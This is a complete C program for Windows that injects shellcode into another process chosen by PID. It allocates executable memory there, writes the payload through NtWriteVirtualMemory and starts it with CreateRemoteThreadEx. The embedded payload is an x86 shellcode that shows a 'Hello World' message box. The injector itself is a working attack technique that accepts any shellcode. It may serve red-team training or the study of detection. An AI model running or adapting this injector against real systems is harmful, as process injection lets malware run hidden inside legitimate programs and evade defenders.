#include <Windows.h>
#include <stdio.h>
#include <winternl.h>

DWORD PID, TID = NULL;
HANDLE hProcess, hThread = INVALID_HANDLE_VALUE;
LPVOID rBuffer = NULL;
// Win32 - MessageBox(x86)
unsigned char crew[] = "\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b"
                       "\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09"
                       "\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d"
                       "\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03"
                       "\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81"
                       "\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
                       "\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03"
                       "\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3"
                       "\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68"
                       "\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68"
                       "\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9"
                       "\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
                       "\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01"
                       "\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68"
                       "\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68"
                       "\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68"
                       "\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57"
                       "\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
                       "\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78"
                       "\x69\x74\x54\x53\xff\xd6\x57\xff\xd0";

typedef NTSTATUS(WINAPI* pNtWriteVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID BaseAddress,
	PVOID Buffer,
	ULONG BufferSize,
	PULONG NumberOfBytesWritten
	);

int wmain(int argc, wchar_t* argv[]) {
	SetConsoleTitle(L"Who's laughing now?!");

	if (argc < 2) {
		printf_s("[!] Usage: %ws <PID>\n", argv[0]);
		return EXIT_FAILURE;
	}

	PID = _wtoi(argv[1]);
	printf_s("[*] Attempting to open a handle to process with PID: %ld\n", PID);

	if (!(hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, PID))) {
		printf_s("[-] Failed to obtain handle to process (%ld). Error: %ld\n", PID, GetLastError());
		return EXIT_FAILURE;
	}
	printf_s("[+] Successfully obtained process handle: 0x%p\n", hProcess);

	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(crew), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!rBuffer) {
		printf_s("[-] Memory allocation in remote process failed. Error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf_s("[+] Allocated %zu bytes in target process with PAGE_EXECUTE_READWRITE permissions\n", sizeof(crew));

	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
	pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	if (NtWriteVirtualMemory(hProcess, rBuffer, crew, sizeof(crew), NULL) != 0) {
		printf_s("[-] Failed to write payload into remote process memory. Error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	// Alternative:
	// if (!WriteProcessMemory(hProcess, rBuffer, crew, sizeof(crew), NULL)) {
	//     printf_s("[-] Failed to write to process memory. Error: %ld\n", GetLastError());
	//     return EXIT_FAILURE;
	// }
	printf_s("[+] Payload successfully written to remote process memory\n");

	if (!(hThread = CreateRemoteThreadEx(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)rBuffer, NULL, NULL, NULL, &TID))) {
		printf_s("[-] Failed to create remote thread. Error: %ld\n", GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf_s("[+] Remote thread created successfully (TID: %ld, Handle: 0x%p)\n", TID, hThread);

	printf_s("[*] Waiting for remote thread to finish execution...\n");
	WaitForSingleObject(hThread, INFINITE);
	printf_s("[+] Remote thread execution completed.\n");

	printf_s("[*] Cleaning up handles...\n");
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf_s("[+] Cleanup complete. Exiting.\n");

	return EXIT_SUCCESS;
}
